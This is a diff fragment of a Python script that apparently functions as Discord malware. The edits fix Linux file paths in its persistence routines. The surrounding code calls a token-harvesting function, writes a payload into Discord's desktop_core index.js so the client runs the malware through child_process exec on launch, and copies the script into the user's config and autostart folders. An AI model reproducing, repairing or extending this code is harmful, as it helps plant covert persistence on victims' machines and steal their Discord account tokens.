@@ -78,7 +78,7 @@ if system == "Linux":
         find_tokens(str(path1))
 
 def even_more_persistance_linux():
-    jspath = home + "\\.config\\discord\\0.0.13\\modules\\discord_desktop_core\\index.js"
+    jspath = home + "//.config//discord//0.0.13//modules//discord_desktop_core//index.js"
     payload = """module.exports = require('./core.asar');
 const { exec } = require("child_process");
 exec(""""'" + home + "\\.config\\" + base + "'"""", (error, stdout, stderr) => {
@@ -129,9 +129,9 @@ async def on_ready():
             pass
         even_more_persistance_windows()
     if system == "Linux":
-        if not os.path.isfile(home + ".config\\" + base):
-            shutil.copy(__file__, home + ".config\\autostart" + base)
-            shutil.copy(__file__, home + ".config\\" + base)
+        if not os.path.isfile(home + ".config//" + base):
+            shutil.copy(__file__, home + ".config//autostart" + base)
+            shutil.copy(__file__, home + ".config//" + base)
         even_more_persistance_linux()
     await bot.change_presence(activity=discord.Game(name="BRAAAAAAAINS"))
     #for friend in bot.user.friends:
